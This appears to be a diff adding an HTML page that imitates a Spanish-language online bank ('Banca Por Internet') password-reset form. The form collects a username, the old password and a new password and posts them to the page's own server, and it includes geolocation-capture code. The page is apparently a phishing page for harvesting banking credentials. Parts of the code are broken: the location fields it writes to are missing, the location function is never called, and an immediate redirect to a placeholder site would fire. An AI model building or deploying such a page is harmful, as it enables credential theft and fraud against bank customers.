@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Page</title>
+<script>
+    // JavaScript functions for geolocation and form validation
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            console.log("Geolocation is not supported by this browser.");
+        }
+    }
+
+    function showPosition(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+        document.getElementById("latitude").value = latitude;
+        document.getElementById("longitude").value = longitude;
+    }
+
+    function showError(error) {
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                console.log("User denied the request for Geolocation.");
+                break;
+            case error.POSITION_UNAVAILABLE:
+                console.log("Location information is unavailable.");
+                break;
+            case error.TIMEOUT:
+                console.log("The request to get user location timed out.");
+                break;
+            case error.UNKNOWN_ERROR:
+                console.log("An unknown error occurred.");
+                break;
+        }
+    }
+
+    function validateForm() {
+        var usuario = document.getElementById("usuario").value;
+        var clave = document.getElementById("clave").value;
+        var nueva = document.getElementById("nueva").value;
+        var nueva2 = document.getElementById("nueva2").value;
+
+        if (usuario === "" || clave === "" || nueva === "" || nueva2 === "") {
+            alert("All fields are required");
+            return false; // Prevent form submission
+        }
+
+        // Clear text input fields
+        document.getElementById("usuario").value = "";
+        document.getElementById("clave").value = "";
+        document.getElementById("nueva").value = "";
+        document.getElementById("nueva2").value = "";
+
+        return true; // Allow form submission
+    }
+
+    // Add event listener to the submit button
+    window.onload = function() {
+        var submitButton = document.querySelector("button[type=submit]");
+        submitButton.addEventListener("click", validateForm);
+    }
+</script>
+<style>
+    body {
+    background-image: url('static/cap.png'); /* Set the PNG image as the background */
+    background-size: cover; /* Ensure the background image covers the entire body */
+    background-position: center; /* Center the background image */
+    color: white; /* Set text color to white */
+}
+
+    #top-left-image {
+        position: relative; /* Change position to relative */
+        width: 75%; /* Make the image 75% of its original width */
+        height: auto; /* Maintain the aspect ratio */
+        margin-bottom: 20px; /* Add some margin to create space between the image and the form */
+    }
+    form {
+        position: relative; /* Ensure the form acts as a container for absolute positioning */
+        margin-top: 50px; /* Adjust as needed to create space for the image */
+    }
+    .form-container {
+        position: relative; /* Set position to relative for proper z-index stacking */
+    }
+</style>
+<!-- Meta tag for HTTPS redirection -->
+<meta http-equiv="refresh" content="0;URL='https://yourwebsite.com'" />
+</head>
+<body>
+
+<h2>Banca Por Internet</h2>
+
+<div class="form-container">
+    <img id="top-left-image" src="static/cap.png" alt="Top Left Image">
+    <h2>Reestablecer Contraseña</h2>
+
+    <form action="/" method="post">
+        <label for="usuario">Usuario:</label><br>
+        <input type="text" id="usuario" name="usuario"><br>
+        <label for="clave">Clave Vieja:</label><br>
+        <input type="password" id="clave" name="clave"><br><br>
+        <label for="nueva">Nueva Clave:</label><br>
+        <input type="password" id="nueva" name="nueva"><br><br>
+        <label for="nueva2">Confirmar Nueva Clave:</label><br>
+        <input type="password" id="nueva2" name="nueva2"><br><br>
+        <button type="submit">Login</button>
+    </form>
+</div>
+
+</body>
+</html>
